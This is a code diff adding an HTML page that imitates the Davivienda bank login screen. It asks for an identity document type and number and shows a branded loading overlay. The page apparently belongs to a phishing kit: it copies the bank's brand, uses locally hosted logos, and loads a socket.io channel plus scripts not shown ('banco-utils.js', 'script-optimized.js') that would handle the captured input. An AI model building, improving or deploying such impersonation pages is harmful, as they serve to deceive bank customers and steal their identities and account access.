@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Inicio de Sesión</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 0;
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 340px;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-section {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-section img {
+            height: 35px;
+            width: auto;
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .greeting {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        select, input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: 'Poppins', sans-serif;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.3s;
+        }
+
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23333' d='M1.41 0L6 4.59L10.59 0L12 1.41l-6 6l-6-6z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 12px;
+            padding-right: 35px;
+            cursor: pointer;
+        }
+
+        input[type="text"]:focus,
+        select:focus {
+            outline: none;
+            border-color: #ED1C24;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            margin-top: 20px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            cursor: pointer;
+            accent-color: #ED1C24;
+        }
+
+        .checkbox-container label {
+            margin: 0;
+            font-size: 13px;
+            color: #333;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        .checkbox-container a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .checkbox-container a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background-color: #ED1C24;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s;
+            margin-bottom: 80px;
+        }
+
+        .btn-continue:hover {
+            background-color: #d01920;
+        }
+
+        .btn-continue:active {
+            background-color: #b01519;
+        }
+
+        .forgot-password {
+            text-align: center;
+            padding: 20px 25px;
+            background-color: #f8f8f8;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .forgot-password p {
+            font-size: 14px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                box-shadow: none;
+            }
+            
+            body {
+                padding-top: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <img src="img/Davivienda-Logo-Vector.svg-.png" alt="Davivienda">
+        </div>
+        
+        <div class="content">
+            <p class="greeting">¡Hola!</p>
+            <h1 class="welcome-text">Nos alegra que esté aquí</h1>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="documentType">Seleccione su tipo de documento</label>
+                    <select id="documentType" name="documentType">
+                        <option value="cedula">Cédula de Ciudadanía</option>
+                        <option value="ce">Cédula de Extranjería</option>
+                        <option value="pasaporte">Pasaporte</option>
+                        <option value="ti">Tarjeta de Identidad</option>
+                        <option value="ci">Cedula de Identidad</option>
+                        <option value="fidecomiso">Fidecomiso</option>
+                        <option value="tsse">Trj. Seguro Social Extranjero</option>
+                        <option value="se">Sociedad Extranjera sin NIT en Colombia</option>
+                        <option value="nitm">NIT Menores</option>
+                        <option value="rif">RIF Venezuela</option>
+                        <option value="nite">NIT Extranjeria</option>
+                        <option value="nitpn">NIT Persona Natural</option>
+                        <option value="rcn">Registro Civil de Nacimiento</option>
+                        <option value="nitd">NIT Desasociado</option>
+                        <option value="rtn">RTN</option>
+                        <option value="dimex">DIMEX</option>
+                        <option value="ced">CED</option>
+                        <option value="dui">Documento Unico de Identidad</option>
+                        <option value="nits">NIT Salvadoreño</option>
+                        <option value="ppt">Permiso Proteccion Temporal</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="documentNumber">Ingrese su número de documento</label>
+                    <input type="text" id="documentNumber" name="documentNumber" placeholder="" inputmode="numeric">
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="rememberMe" name="rememberMe">
+                    <label for="rememberMe">Recordar mis datos de identidad</label>
+                </div>
+                
+                <button type="button" class="btn-continue" id="submitBtn">Continuar</button>
+            </form>
+        </div>
+        
+        <div class="forgot-password">
+            <p>¿Olvidó o bloqueó su clave?</p>
+        </div>
+    </div>
+
+    <!-- Overlay de carga -->
+    <div class="loading-overlay" id="loadingOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;z-index:9999;">
+        <div class="loading-content" style="text-align:center;">
+            <img src="img/logo-davivienda.png" alt="Davivienda" style="width:150px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
+        </div>
+    </div>
+    <style>
+        .loading-overlay.show,
+        .loading-overlay.active {
+            display: flex !important;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(0.95); }
+        }
+        .btn-continue.enabled {
+            opacity: 1;
+            cursor: pointer;
+        }
+    </style>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="script-optimized.js"></script>
+</body>
+</html>
